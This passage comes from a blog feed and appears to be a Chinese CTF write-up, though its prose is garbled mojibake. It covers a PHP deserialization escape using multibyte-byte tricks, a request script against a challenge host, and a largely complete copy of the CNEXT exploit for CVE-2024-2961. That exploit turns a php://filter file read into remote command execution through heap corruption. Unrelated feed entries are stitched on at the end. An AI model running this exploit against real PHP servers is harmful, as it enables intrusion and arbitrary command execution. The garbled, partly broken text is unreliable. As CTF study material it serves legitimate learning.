çš„é“¾å­é€ƒé€¸å‡ºå»ã€‚æˆ‘ä»¬å°†é“¾å­ç›´æ¥èµ‹å€¼ç»™startå¾—åˆ°çš„<code>$ctf</code>ä¸º<code>O:9:&quot;read_file&quot;:2:&#123;s:5:&quot;start&quot;;s:75:&quot;O:9:&quot;read_file&quot;:2:&#123;s:5:&quot;start&quot;;s:9:&quot;gxngxngxn&quot;;s:8:&quot;filename&quot;;s:5:&quot;/flag&quot;;&#125;&quot;;s:8:&quot;filename&quot;;s:5:&quot;/flag&quot;;&#125;</code>æ›´åŠ æˆ‘ä»¬ä¸Šé¢æåˆ°çš„æ¯å¢åŠ ä¸€ä¸ª<code>\xF0\x9F\xF0\x9F</code>åç»­å­—ç¬¦åœ¨ç»è¿‡å¤„ç†åå°±ä¼šè¢«åæ‰ä¸€ä¸ªå­—ç¬¦ã€‚é‚£ä¹ˆæˆ‘ä»¬åªè¦åœ¨<code>[</code>å‰é¢åŠ ä¸Š37ä¸ª<code>\xF0\x9F\xF0\x9F</code>å°±å¯ä½¿å¾—<code>$ctf</code>å˜ä¸º<code>O:9:&quot;read_file&quot;:2:&#123;s:5:&quot;start&quot;;s:9:&quot;gxngxngxn&quot;;s:8:&quot;filename&quot;;s:5:&quot;/flag&quot;;&#125;&quot;;s:8:&quot;filename&quot;;s:5:&quot;/flag&quot;;&#125;]</code>å³æˆ‘ä»¬å°†é“¾å­é€ƒé€¸äº†å‡ºå»ã€‚<br>æ‰€ä»¥åªè¦ç»™readä¼ 37ä¸ª<code>\xF0\x9F\xF0\x9F</code>å³å¯é€ƒé€¸æˆåŠŸã€‚</p><h2 id="äºŒ"><a href="#äºŒ" class="headerlink" title="äºŒ"></a>äºŒ</h2><p>é€šè¿‡%9fä¹Ÿå¯ä»¥æ¥æ„é€ é“¾å­<br>åŒæ ·æˆ‘ä»¬è¦æ„é€ <code>O:9:&quot;read_file&quot;:2:&#123;s:5:&quot;start&quot;;s:9:&quot;gxngxngxn&quot;;s:8:&quot;filename&quot;;s:5:&quot;/flag&quot;;&#125;</code>å…¶ä½†æ˜¯ç”±äº%9fä¼šä½¿å¾—æˆªå–èŒƒå›´ç®—æ˜¯å‰ç§»ã€‚å³å¦‚ä¸‹<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">substrstr</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$start</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;[&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$start</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="variable">$end</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;]&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$end</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">mb_substr</span>(<span class="variable">$data</span>, <span class="variable">$start</span> + <span class="number">1</span>, <span class="variable">$end</span> - <span class="number">1</span> - <span class="variable">$start</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$read</span>=<span class="string">&quot;\x9f\x9f\x9f\x9f\x9f1111[aaaa]&quot;</span>;</span><br><span class="line"><span class="variable">$data</span>=<span class="title function_ invoke__">substrstr</span>(<span class="variable">$read</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$data</span>;</span><br></pre></td></tr></table></figure><br>è¾“å‡º<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">4</span><br><span class="line">9</span><br><span class="line">1111</span><br></pre></td></tr></table></figure><br>å‡è®¾1111ä¸ºæˆ‘ä»¬è¦ä½¿ç”¨çš„payloadï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å‘ç°åªè¦å°†æˆªå–çš„å†…å®¹å‰ç§»payloadé•¿åº¦+1ä¸ªå­—ç¬¦å°±å¯ä»¥æˆåŠŸé€ƒé€¸ï¼ŒäºŒæ‹¬å·å†…çš„å†…å®¹é•¿åº¦è¦å¤§äºpayloadçš„é•¿åº¦ã€‚<br>å³æˆ‘ä»¬å¯ä»¥æ„é€ å¦‚ä¸‹è„šæœ¬<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">path=<span class="string">&quot;/etc/hosts&quot;</span></span><br><span class="line">payload_file=<span class="string">&#x27;O:9:&quot;read_file&quot;:2:&#123;s:5:&quot;start&quot;;s:9:&quot;gxngxngxn&quot;;s:8:&quot;filename&quot;;s:&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(path))+<span class="string">&#x27;:&quot;&#x27;</span>+path+<span class="string">&#x27;&quot;;&#125;&#x27;</span></span><br><span class="line">payload=<span class="string">&#x27;%9f&#x27;</span>*(<span class="built_in">len</span>(payload_file)+<span class="number">1</span>)+payload_file.replace(<span class="string">&quot;+&quot;</span>,<span class="string">&quot;%2b&quot;</span>)</span><br><span class="line">start=<span class="string">&quot;a&quot;</span>*(<span class="built_in">len</span>(payload_file)+<span class="number">11</span>)</span><br><span class="line">url=<span class="string">&quot;https://d34019c5-7d46-48e6-bed4-de3459da6865.challenge.ctf.show/&quot;</span>+<span class="string">f&quot;?start=<span class="subst">&#123;start&#125;</span>&amp;read=<span class="subst">&#123;payload&#125;</span>&quot;</span></span><br><span class="line">req=requests.get(url)</span><br><span class="line"><span class="built_in">print</span>(req.text</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>ä½†æ˜¯è™½ç„¶å¯ä»¥æ–‡ä»¶è¯»å–ä½†æ˜¯å¹¶ä¸çŸ¥é“æ–‡ä»¶çš„åå­—ä¸ºä»€ä¹ˆã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦rce</p><h2 id="CVE-2024-2961ï¼šå°†phpfilterä»»æ„æ–‡ä»¶è¯»å–æå‡ä¸ºè¿œç¨‹ä»£ç æ‰§è¡Œ"><a href="#CVE-2024-2961ï¼šå°†phpfilterä»»æ„æ–‡ä»¶è¯»å–æå‡ä¸ºè¿œç¨‹ä»£ç æ‰§è¡Œ" class="headerlink" title="CVE-2024-2961ï¼šå°†phpfilterä»»æ„æ–‡ä»¶è¯»å–æå‡ä¸ºè¿œç¨‹ä»£ç æ‰§è¡Œ"></a>CVE-2024-2961ï¼šå°†phpfilterä»»æ„æ–‡ä»¶è¯»å–æå‡ä¸ºè¿œç¨‹ä»£ç æ‰§è¡Œ</h2><p>å‚è€ƒ:<br><a href="https://xz.aliyun.com/t/14690">https://xz.aliyun.com/t/14690</a></p><p>åŸä½œè€…ç»™å‡ºçš„exp:<br><a href="https://github.com/ambionics/cnext-exploits/blob/main/cnext-exploit.py">https://github.com/ambionics/cnext-exploits/blob/main/cnext-exploit.py</a></p><p>å› ä¸ºè¿™ä¸ªæ˜¯åˆ©ç”¨äº†glibcçš„æˆ‘ä¸æ‡‚åº”è¯¥æ˜¯å±äºpwnçš„èŒƒå›´çš„æ‰€ä»¥æˆ‘å°±å½“ä¸ªè„šæœ¬å°å­å³å¯</p><p>è™½ç„¶æœ‰expä½†æ˜¯æˆ‘ä»¬è¿˜éœ€è¦è¿›è¡Œå°å°çš„ä¿®æ”¹å¦‚ä¸‹<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># CNEXT: PHP file-read to RCE</span></span><br><span class="line"><span class="comment"># Date: 2024-05-27</span></span><br><span class="line"><span class="comment"># Author: Charles FOL @cfreal_ (LEXFO/AMBIONICS)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># TODO Parse LIBC to know if patched</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># INFORMATIONS</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># To use, implement the Remote class, which tells the exploit how to send the payload.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># REQUIREMENTS</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Requires ten: https://github.com/cfreal/ten</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> annotations</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> dataclasses <span class="keyword">import</span> dataclass</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> requests.exceptions <span class="keyword">import</span> ChunkedEncodingError, ConnectionError</span><br><span class="line"><span class="keyword">from</span> ten <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">HEAP_SIZE = <span class="number">2</span> * <span class="number">1024</span> * <span class="number">1024</span></span><br><span class="line">BUG = <span class="string">&quot;åŠ„&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Remote</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;A helper class to send the payload and download files.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    The logic of the exploit is always the same, but the exploit needs to know how to</span></span><br><span class="line"><span class="string">    download files (/proc/self/maps and libc) and how to send the payload.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    The code here serves as an example that attacks a page that looks like:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    ```php</span></span><br><span class="line"><span class="string">    &lt;?php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    $data = file_get_contents($_POST[&#x27;file&#x27;]);</span></span><br><span class="line"><span class="string">    echo &quot;File contents: $data&quot;;</span></span><br></pre></td></tr></table></figure></p><pre><code>Tweak it to fit your target, and start the exploit.&quot;&quot;&quot;def __init__(self, url: str) -&gt; None:    self.url = url    self.session = Session()def send(self, path: str) -&gt; Response:    &quot;&quot;&quot;Sends given `path` to the HTTP server. Returns the response.    &quot;&quot;&quot;    payload_file = &#39;O:9:&quot;read_file&quot;:2:&#123;s:5:&quot;start&quot;;s:9:&quot;gxngxngxn&quot;;s:8:&quot;filename&quot;;s:&#39; + str(len(path)) + &#39;:&quot;&#39; + path + &#39;&quot;;&#125;&#39;    payload = &quot;%9f&quot; * (len(payload_file) + 1) + payload_file.replace(&quot;+&quot;,&quot;%2b&quot;)    filename_len = &quot;a&quot; * (len(path) + 10)    url = self.url+f&quot;?start=&#123;filename_len&#125;&amp;read=&#123;payload&#125;&quot;    return self.session.get(url)def download(self, path: str) -&gt; bytes:    &quot;&quot;&quot;Returns the contents of a remote file.    &quot;&quot;&quot;    path = f&quot;php://filter/convert.base64-encode/resource=&#123;path&#125;&quot;    response = self.send(path)    data = response.re.search(b&quot;What you are reading is:(.*)&quot;, flags=re.S).group(1)    return base64.decode(data)</code></pre><p>@entry<br>@arg(â€œurlâ€, â€œTarget URLâ€)<br>@arg(â€œcommandâ€, â€œCommand to run on the system; limited to 0x140 bytesâ€)<br>@arg(â€œsleep_timeâ€, â€œTime to sleep to assert that the exploit worked. By default, 1.â€)<br>@arg(â€œheapâ€, â€œAddress of the main zend_mm_heap structure.â€)<br>@arg(<br>    â€œpadâ€,<br>    â€œNumber of 0x100 chunks to pad with. If the website makes a lot of heap â€œ<br>    â€œoperations with this size, increase this. Defaults to 20.â€,<br>)<br>@dataclass<br>class Exploit:<br>    â€œâ€â€CNEXT exploit: RCE using a file read primitive in PHP.â€â€â€</p><pre><code>url: strcommand: strsleep: int = 1heap: str = Nonepad: int = 20def __post_init__(self):    self.remote = Remote(self.url)    self.log = logger(&quot;EXPLOIT&quot;)    self.info = &#123;&#125;    self.heap = self.heap and int(self.heap, 16)def check_vulnerable(self) -&gt; None:    &quot;&quot;&quot;Checks whether the target is reachable and properly allows for the various    wrappers and filters that the exploit needs.    &quot;&quot;&quot;    def safe_download(path: str) -&gt; bytes:        try:            return self.remote.download(path)        except ConnectionError:            failure(&quot;Target not [b]reachable[/] ?&quot;)    def check_token(text: str, path: str) -&gt; bool:        result = safe_download(path)        return text.encode() == result    text = tf.random.string(50).encode()    base64 = b64(text, misalign=True).decode()    path = f&quot;data:text/plain;base64,&#123;base64&#125;&quot;    result = safe_download(path)    if text not in result:        msg_failure(&quot;Remote.download did not return the test string&quot;)        print(&quot;--------------------&quot;)        print(f&quot;Expected test string: &#123;text&#125;&quot;)        print(f&quot;Got: &#123;result&#125;&quot;)        print(&quot;--------------------&quot;)        failure(&quot;If your code works fine, it means that the [i]data://[/] wrapper does not work&quot;)    msg_info(&quot;The [i]data://[/] wrapper works&quot;)    text = tf.random.string(50)    base64 = b64(text.encode(), misalign=True).decode()    path = f&quot;php://filter//resource=data:text/plain;base64,&#123;base64&#125;&quot;    if not check_token(text, path):        failure(&quot;The [i]php://filter/[/] wrapper does not work&quot;)    msg_info(&quot;The [i]php://filter/[/] wrapper works&quot;)    text = tf.random.string(50)    base64 = b64(compress(text.encode()), misalign=True).decode()    path = f&quot;php://filter/zlib.inflate/resource=data:text/plain;base64,&#123;base64&#125;&quot;    if not check_token(text, path):        failure(&quot;The [i]zlib[/] extension is not enabled&quot;)    msg_info(&quot;The [i]zlib[/] extension is enabled&quot;)    msg_success(&quot;Exploit preconditions are satisfied&quot;)def get_file(self, path: str) -&gt; bytes:    with msg_status(f&quot;Downloading [i]&#123;path&#125;[/]...&quot;):        return self.remote.download(path)def get_regions(self) -&gt; list[Region]:    &quot;&quot;&quot;Obtains the memory regions of the PHP process by querying /proc/self/maps.&quot;&quot;&quot;    maps = self.get_file(&quot;/proc/self/maps&quot;)    maps = maps.decode()    PATTERN = re.compile(        r&quot;^([a-f0-9]+)-([a-f0-9]+)\b&quot; r&quot;.*&quot; r&quot;\s([-rwx]&#123;3&#125;[ps])\s&quot; r&quot;(.*)&quot;    )    regions = []    for region in table.split(maps, strip=True):        if match := PATTERN.match(region):            start = int(match.group(1), 16)            stop = int(match.group(2), 16)            permissions = match.group(3)            path = match.group(4)            if &quot;/&quot; in path or &quot;[&quot; in path:                path = path.rsplit(&quot; &quot;, 1)[-1]            else:                path = &quot;&quot;            current = Region(start, stop, permissions, path)            regions.append(current)        else:            print(maps)            failure(&quot;Unable to parse memory mappings&quot;)    self.log.info(f&quot;Got &#123;len(regions)&#125; memory regions&quot;)    return regionsdef get_symbols_and_addresses(self) -&gt; None:    &quot;&quot;&quot;Obtains useful symbols and addresses from the file read primitive.&quot;&quot;&quot;    regions = self.get_regions()    LIBC_FILE = &quot;/dev/shm/cnext-libc&quot;    # PHP&#39;s heap    self.info[&quot;heap&quot;] = self.heap or self.find_main_heap(regions)    # Libc    libc = self._get_region(regions, &quot;libc-&quot;, &quot;libc.so&quot;)    self.download_file(libc.path, LIBC_FILE)    self.info[&quot;libc&quot;] = ELF(LIBC_FILE, checksec=False)    self.info[&quot;libc&quot;].address = libc.startdef _get_region(self, regions: list[Region], *names: str) -&gt; Region:    &quot;&quot;&quot;Returns the first region whose name matches one of the given names.&quot;&quot;&quot;    for region in regions:        if any(name in region.path for name in names):            break    else:        failure(&quot;Unable to locate region&quot;)    return regiondef download_file(self, remote_path: str, local_path: str) -&gt; None:    &quot;&quot;&quot;Downloads `remote_path` to `local_path`&quot;&quot;&quot;    data = self.get_file(remote_path)    Path(local_path).write(data)def find_main_heap(self, regions: list[Region]) -&gt; Region:    # Any anonymous RW region with a size superior to the base heap size is a    # candidate. The heap is at the bottom of the region.    heaps = [        region.stop - HEAP_SIZE + 0x40        for region in reversed(regions)        if region.permissions == &quot;rw-p&quot;        and region.size &gt;= HEAP_SIZE        and region.stop &amp; (HEAP_SIZE - 1) == 0        and region.path == &quot;&quot;    ]    if not heaps:        failure(&quot;Unable to find PHP&#39;s main heap in memory&quot;)    first = heaps[0]    if len(heaps) &gt; 1:        heaps = &quot;, &quot;.join(map(hex, heaps))        msg_info(f&quot;Potential heaps: [i]&#123;heaps&#125;[/] (using first)&quot;)    else:        msg_info(f&quot;Using [i]&#123;hex(first)&#125;[/] as heap&quot;)    return firstdef run(self) -&gt; None:    self.check_vulnerable()    self.get_symbols_and_addresses()    self.exploit()def build_exploit_path(self) -&gt; str:    &quot;&quot;&quot;    On each step of the exploit, a filter will process each chunk one after the    other. Processing generally involves making some kind of operation either    on the chunk or in a destination chunk of the same size. Each operation is    applied on every single chunk; you cannot make PHP apply iconv on the first 10    chunks and leave the rest in place. That&#39;s where the difficulties come from.    Keep in mind that we know the address of the main heap, and the libraries.    ASLR/PIE do not matter here.    The idea is to use the bug to make the freelist for chunks of size 0x100 point    lower. For instance, we have the following free list:    ... -&gt; 0x7fffAABBCC900 -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCCB00    By triggering the bug from chunk ..900, we get:    ... -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCCB48 -&gt; ???    That&#39;s step 3.    Now, in order to control the free list, and make it point whereever we want,    we need to have previously put a pointer at address 0x7fffAABBCCB48. To do so,    we&#39;d have to have allocated 0x7fffAABBCCB00 and set our pointer at offset 0x48.    That&#39;s step 2.    Now, if we were to perform step2 an then step3 without anything else, we&#39;d have    a problem: after step2 has been processed, the free list goes bottom-up, like:    0x7fffAABBCCB00 -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCC900    We need to go the other way around. That&#39;s why we have step 1: it just allocates    chunks. When they get freed, they reverse the free list. Now step2 allocates in    reverse order, and therefore after step2, chunks are in the correct order.    Another problem comes up.    To trigger the overflow in step3, we convert from UTF-8 to ISO-2022-CN-EXT.    Since step2 creates chunks that contain pointers and pointers are generally not    UTF-8, we cannot afford to have that conversion happen on the chunks of step2.    To avoid this, we put the chunks in step2 at the very end of the chain, and    prefix them with `0\n`. When dechunked (right before the iconv), they will    &quot;disappear&quot; from the chain, preserving them from the character set conversion    and saving us from an unwanted processing error that would stop the processing    chain.    After step3 we have a corrupted freelist with an arbitrary pointer into it. We    don&#39;t know the precise layout of the heap, but we know that at the top of the    heap resides a zend_mm_heap structure. We overwrite this structure in two ways.    Its free_slot[] array contains a pointer to each free list. By overwriting it,    we can make PHP allocate chunks whereever we want. In addition, its custom_heap    field contains pointers to hook functions for emalloc, efree, and erealloc    (similarly to malloc_hook, free_hook, etc. in the libc). We overwrite them and    then overwrite the use_custom_heap flag to make PHP use these function pointers    instead. We can now do our favorite CTF technique and get a call to    system(&lt;chunk&gt;).    We make sure that the &quot;system&quot; command kills the current process to avoid other    system() calls with random chunk data, leading to undefined behaviour.    The pad blocks just &quot;pad&quot; our allocations so that even if the heap of the    process is in a random state, we still get contiguous, in order chunks for our    exploit.    Therefore, the whole process described here CANNOT crash. Everything falls    perfectly in place, and nothing can get in the middle of our allocations.    &quot;&quot;&quot;    LIBC = self.info[&quot;libc&quot;]    ADDR_EMALLOC = LIBC.symbols[&quot;__libc_malloc&quot;]    ADDR_EFREE = LIBC.symbols[&quot;__libc_system&quot;]    ADDR_EREALLOC = LIBC.symbols[&quot;__libc_realloc&quot;]    ADDR_HEAP = self.info[&quot;heap&quot;]    ADDR_FREE_SLOT = ADDR_HEAP + 0x20    ADDR_CUSTOM_HEAP = ADDR_HEAP + 0x0168    ADDR_FAKE_BIN = ADDR_FREE_SLOT - 0x10    CS = 0x100    # Pad needs to stay at size 0x100 at every step    pad_size = CS - 0x18    pad = b&quot;\x00&quot; * pad_size    pad = chunked_chunk(pad, len(pad) + 6)    pad = chunked_chunk(pad, len(pad) + 6)    pad = chunked_chunk(pad, len(pad) + 6)    pad = compressed_bucket(pad)    step1_size = 1    step1 = b&quot;\x00&quot; * step1_size    step1 = chunked_chunk(step1)    step1 = chunked_chunk(step1)    step1 = chunked_chunk(step1, CS)    step1 = compressed_bucket(step1)    # Since these chunks contain non-UTF-8 chars, we cannot let it get converted to    # ISO-2022-CN-EXT. We add a `0\n` that makes the 4th and last dechunk &quot;crash&quot;    step2_size = 0x48    step2 = b&quot;\x00&quot; * (step2_size + 8)    step2 = chunked_chunk(step2, CS)    step2 = chunked_chunk(step2)    step2 = compressed_bucket(step2)    step2_write_ptr = b&quot;0\n&quot;.ljust(step2_size, b&quot;\x00&quot;) + p64(ADDR_FAKE_BIN)    step2_write_ptr = chunked_chunk(step2_write_ptr, CS)    step2_write_ptr = chunked_chunk(step2_write_ptr)    step2_write_ptr = compressed_bucket(step2_write_ptr)    step3_size = CS    step3 = b&quot;\x00&quot; * step3_size    assert len(step3) == CS    step3 = chunked_chunk(step3)    step3 = chunked_chunk(step3)    step3 = chunked_chunk(step3)    step3 = compressed_bucket(step3)    step3_overflow = b&quot;\x00&quot; * (step3_size - len(BUG)) + BUG    assert len(step3_overflow) == CS    step3_overflow = chunked_chunk(step3_overflow)    step3_overflow = chunked_chunk(step3_overflow)    step3_overflow = chunked_chunk(step3_overflow)    step3_overflow = compressed_bucket(step3_overflow)    step4_size = CS    step4 = b&quot;=00&quot; + b&quot;\x00&quot; * (step4_size - 1)    step4 = chunked_chunk(step4)    step4 = chunked_chunk(step4)    step4 = chunked_chunk(step4)    step4 = compressed_bucket(step4)    # This chunk will eventually overwrite mm_heap-&gt;free_slot    # it is actually allocated 0x10 bytes BEFORE it, thus the two filler values    step4_pwn = ptr_bucket(        0x200000,        0,        # free_slot        0,        0,        ADDR_CUSTOM_HEAP,  # 0x18        0,        0,        0,        0,        0,        0,        0,        0,        0,        0,        0,        0,        0,        ADDR_HEAP,  # 0x140        0,        0,        0,        0,        0,        0,        0,        0,        0,        0,        0,        0,        0,        size=CS,    )    step4_custom_heap = ptr_bucket(        ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=0x18    )    step4_use_custom_heap_size = 0x140    COMMAND = self.command    COMMAND = f&quot;kill -9 $PPID; &#123;COMMAND&#125;&quot;    if self.sleep:        COMMAND = f&quot;sleep &#123;self.sleep&#125;; &#123;COMMAND&#125;&quot;    COMMAND = COMMAND.encode() + b&quot;\x00&quot;    assert (            len(COMMAND) &lt;= step4_use_custom_heap_size    ), f&quot;Command too big (&#123;len(COMMAND)&#125;), it must be strictly inferior to &#123;hex(step4_use_custom_heap_size)&#125;&quot;    COMMAND = COMMAND.ljust(step4_use_custom_heap_size, b&quot;\x00&quot;)    step4_use_custom_heap = COMMAND    step4_use_custom_heap = qpe(step4_use_custom_heap)    step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)    step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)    step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)    step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)    pages = (            step4 * 3            + step4_pwn            + step4_custom_heap            + step4_use_custom_heap            + step3_overflow            + pad * self.pad            + step1 * 3            + step2_write_ptr            + step2 * 2    )    resource = compress(compress(pages))    resource = b64(resource)    resource = f&quot;data:text/plain;base64,&#123;resource.decode()&#125;&quot;    filters = [        # Create buckets        &quot;zlib.inflate&quot;,        &quot;zlib.inflate&quot;,        # Step 0: Setup heap        &quot;dechunk&quot;,        &quot;convert.iconv.latin1.latin1&quot;,        # Step 1: Reverse FL order        &quot;dechunk&quot;,        &quot;convert.iconv.latin1.latin1&quot;,        # Step 2: Put fake pointer and make FL order back to normal        &quot;dechunk&quot;,        &quot;convert.iconv.latin1.latin1&quot;,        # Step 3: Trigger overflow        &quot;dechunk&quot;,        &quot;convert.iconv.UTF-8.ISO-2022-CN-EXT&quot;,        # Step 4: Allocate at arbitrary address and change zend_mm_heap        &quot;convert.quoted-printable-decode&quot;,        &quot;convert.iconv.latin1.latin1&quot;,    ]    filters = &quot;|&quot;.join(filters)    path = f&quot;php://filter/read=&#123;filters&#125;/resource=&#123;resource&#125;&quot;    return path@inform(&quot;Triggering...&quot;)def exploit(self) -&gt; None:    path = self.build_exploit_path()    start = time.time()    try:        self.remote.send(path)    except (ConnectionError, ChunkedEncodingError):        pass    msg_print()    if not self.sleep:        msg_print(&quot;    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]&quot;)    elif start + self.sleep &lt;= time.time():        msg_print(&quot;    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]&quot;)    else:        # Wrong heap, maybe? If the exploited suggested others, use them!        msg_print(&quot;    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]&quot;)    msg_print()</code></pre><p>def compress(data) -&gt; bytes:<br>    â€œâ€â€Returns data suitable for <code>zlib.inflate</code>.<br>    â€œâ€â€</p><pre><code># Remove 2-byte header and 4-byte checksumreturn zlib.compress(data, 9)[2:-4]</code></pre><p>def b64(data: bytes, misalign=True) -&gt; bytes:<br>    payload = base64.encode(data)<br>    if not misalign and payload.endswith(â€œ=â€):<br>        raise ValueError(fâ€Misaligned: {data}â€)<br>    return payload.encode()</p><p>def compressed_bucket(data: bytes) -&gt; bytes:<br>    â€œâ€â€Returns a chunk of size 0x8000 that, when dechunked, returns the data.â€â€â€<br>    return chunked_chunk(data, 0x8000)</p><p>def qpe(data: bytes) -&gt; bytes:<br>    â€œâ€â€Emulates quoted-printable-encode.<br>    â€œâ€â€<br>    return â€œâ€.join(fâ€={x:02x}â€ for x in data).upper().encode()</p><p>def ptr_bucket(<em>ptrs, size=None) -&gt; bytes:<br>    â€œâ€â€Creates a 0x8000 chunk that reveals pointers after every step has been ran.â€â€â€<br>    if size is not None:<br>        assert len(ptrs) </em> 8 == size<br>    bucket = bâ€â€.join(map(p64, ptrs))<br>    bucket = qpe(bucket)<br>    bucket = chunked_chunk(bucket)<br>    bucket = chunked_chunk(bucket)<br>    bucket = chunked_chunk(bucket)<br>    bucket = compressed_bucket(bucket)</p><pre><code>return bucket</code></pre><p>def chunked_chunk(data: bytes, size: int = None) -&gt; bytes:<br>    â€œâ€â€Constructs a chunked representation of the given chunk. If size is given, the<br>    chunked representation has size <code>size</code>.<br>    For instance, <code>ABCD</code> with size 10 becomes: <code>0004\nABCD\n</code>.<br>    â€œâ€â€</p><pre><code># The caller does not care about the size: let&#39;s just add 8, which is more than# enoughif size is None:    size = len(data) + 8keep = len(data) + len(b&quot;\n\n&quot;)size = f&quot;&#123;len(data):x&#125;&quot;.rjust(size - keep, &quot;0&quot;)return size.encode() + b&quot;\n&quot; + data + b&quot;\n&quot;</code></pre><p>@dataclass<br>class Region:<br>    â€œâ€â€A memory region.â€â€â€</p><pre><code>start: intstop: intpermissions: strpath: str@propertydef size(self) -&gt; int:    return self.stop - self.start</code></pre><p>Exploit()<br>```<br>#</p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
          <category> æ¯”èµ›wp(å¤ç°) </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>checklist</title>
      <link href="/2024/06/30/checklist/"/>
      <url>/2024/06/30/checklist/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¿¡æ¯æ”¶é›†-æ‰¾åˆ°ç«™"><a href="#ä¿¡æ¯æ”¶é›†-æ‰¾åˆ°ç«™" class="headerlink" title="ä¿¡æ¯æ”¶é›†(æ‰¾åˆ°ç«™)"></a>ä¿¡æ¯æ”¶é›†(æ‰¾åˆ°ç«™)</h1><p>1.ç›®å½•æ‰«æ<br>2.webæ¡†æ¶è¯†åˆ«<br>3.</p>]]></content>
      
      
      <categories>
          
          <category> æ”»é˜² </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ”»é˜² </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2024çº¿ä¸‹èµ›åæ„Ÿ</title>
      <link href="/2024/06/24/CISCN2024%E7%BA%BF%E4%B8%8B%E8%B5%9B%E5%90%8E%E6%84%9F/"/>
